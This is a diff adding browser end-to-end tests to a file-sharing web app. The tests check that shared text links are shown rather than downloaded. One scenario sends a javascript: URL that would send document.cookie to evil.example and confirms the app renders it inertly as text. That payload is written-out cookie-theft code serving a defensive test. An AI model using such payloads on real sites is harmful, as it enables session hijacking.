@@ -123,6 +123,28 @@ async function openSender(payloadPaths, tag, opts = {}) {
   return { page, url };
 }
 
+/** Opens the sender in text mode, sends the snippet, and returns the share URL. */
+async function openTextSender(text, tag) {
+  const page = await browser.newPage();
+  page.on("pageerror", (e) => log(`  [${tag} sender pageerror]`, e.message));
+  page.on("console", (m) => {
+    if (m.type() === "error") log(`  [${tag} sender console]`, m.text());
+  });
+  await page.goto(`${BASE}/send`, { waitUntil: "networkidle2" });
+  await page.click(".switch-mode");
+  await page.waitForSelector(".text-input");
+  await page.type(".text-input", text);
+  await domClick(page, ".text-foot .btn");
+  await page.waitForSelector(".link-row input, .notice.bad", { timeout: 20000 });
+  const refusal = await page.$(".notice.bad");
+  if (refusal) {
+    throw new Error(
+      `sender was refused: ${await refusal.evaluate((el) => el.textContent)}`,
+    );
+  }
+  return { page, url: await page.$eval(".link-row input", (el) => el.value) };
+}
+
 async function openReceiver(url, downloadDir, tag) {
   fs.mkdirSync(downloadDir, { recursive: true });
   const page = await browser.newPage();
@@ -623,6 +645,114 @@ try {
       "and is listed on the home page",
       shown.rows === 2 && shown.name.includes("history-check.bin"),
       `${shown.rows} rows, ${JSON.stringify(shown.name)}`,
+    );
+    await Promise.all([send.close(), recv.close()]);
+  }
+  // ===================== 8. a link sent as text is shown, not downloaded
+  // The behaviour worth protecting is the *absence* of a download: every other
+  // payload is auto-saved on arrival, and a snippet must not be.
+  log("\n▸ scenario 8 — a link sent as text");
+  {
+    const LINK = "https://example.com/a/path?q=1&r=2";
+    const dl = path.join(WORK, "dl8");
+    const { page: send, url } = await openTextSender(LINK, "s8");
+    const recv = await openReceiver(url, dl, "s8");
+
+    await recv.waitForSelector(".file-name", { timeout: 20000 });
+    check(
+      "it is offered as a small text file",
+      (await recv.$eval(".file-name", (el) => el.textContent)).includes("link.txt"),
+      await recv.$eval(".file-name", (el) => el.textContent),
+    );
+
+    await (await recv.waitForSelector(".btn.primary")).click();
+    await recv.waitForSelector(".text-received", { timeout: 60000 });
+
+    const shown = await recv.evaluate(() => ({
+      label: document.querySelector(".file-name")?.textContent ?? "",
+      text: document.querySelector(".text-received")?.textContent ?? "",
+      href: document.querySelector(".text-actions a")?.getAttribute("href") ?? null,
+      rel: document.querySelector(".text-actions a")?.getAttribute("rel") ?? "",
+      buttons: [...document.querySelectorAll(".text-actions button")].map((b) =>
+        b.textContent.trim(),
+      ),
+      brightSave: !!document.querySelector("a.btn.primary.wide"),
+    }));
+    check("the text arrives exactly as typed", shown.text === LINK, JSON.stringify(shown.text));
+    check("and is labelled as a link", shown.label === "Link received", shown.label);
+    check("with an Open button pointing at it", shown.href === LINK, String(shown.href));
+    check(
+      "opened with noopener and noreferrer",
+      shown.rel.includes("noopener") && shown.rel.includes("noreferrer"),
+      shown.rel,
+    );
+    check("and a Copy button", shown.buttons.includes("Copy"), shown.buttons.join(", "));
+    check(
+      "the file save is not the bright button — Open is",
+      !shown.brightSave,
+      "otherwise two primary buttons compete",
+    );
+
+    // Copy needs a real input event and a focused tab: a scripted click confers
+    // no user activation, and Chrome refuses the write without one.
+    await recv.bringToFront();
+    await recv.click(".text-actions button");
+    let copyOk = true;
+    try {
+      await recv.waitForFunction(
+        () => document.querySelector(".text-actions button")?.textContent?.trim() === "Copied",
+        { timeout: 5000 },
+      );
+    } catch {
+      copyOk = false;
+    }
+    check(
+      "Copy reports success",
+      copyOk,
+      copyOk
+        ? ""
+        : `button says "${await recv.$eval(".text-actions button", (e) => e.textContent.trim())}"`,
+    );
+
+    const stray = await waitForDownload(dl, 4000);
+    check(
+      "nothing was written to Downloads",
+      stray === null,
+      stray ? `found ${path.basename(stray)}` : "no stray note.txt",
+    );
+
+    await send.waitForFunction(() => document.body.innerText.includes("delivered"), {
+      timeout: 30000,
+    });
+    check("the sender sees it delivered", true);
+    await Promise.all([send.close(), recv.close()]);
+  }
+
+  // ===================== 9. a hostile "link" gets no button
+  // Text arrives from another device. A javascript: URL clicked here would run
+  // in this page's origin, so the Open button must simply not appear.
+  log("\n▸ scenario 9 — text that only looks like a link");
+  {
+    const HOSTILE = "javascript:fetch('https://evil.example/'+document.cookie)";
+    const dl = path.join(WORK, "dl9");
+    const { page: send, url } = await openTextSender(HOSTILE, "s9");
+    const recv = await openReceiver(url, dl, "s9");
+    await (await recv.waitForSelector(".btn.primary", { timeout: 20000 })).click();
+    await recv.waitForSelector(".text-received", { timeout: 60000 });
+
+    const shown = await recv.evaluate(() => ({
+      label: document.querySelector(".file-name")?.textContent ?? "",
+      text: document.querySelector(".text-received")?.textContent ?? "",
+      anchors: document.querySelectorAll(".textout a").length,
+      html: document.querySelector(".text-received")?.innerHTML ?? "",
+    }));
+    check("it still arrives intact, as text", shown.text === HOSTILE, JSON.stringify(shown.text));
+    check("labelled as text, not a link", shown.label === "Text received", shown.label);
+    check("and offers nothing to click", shown.anchors === 0, `${shown.anchors} links`);
+    check(
+      "rendered as text, not as markup",
+      !shown.html.includes("<script") && !/<a\b/i.test(shown.html),
+      shown.html.slice(0, 60),
     );
     await Promise.all([send.close(), recv.close()]);
   }
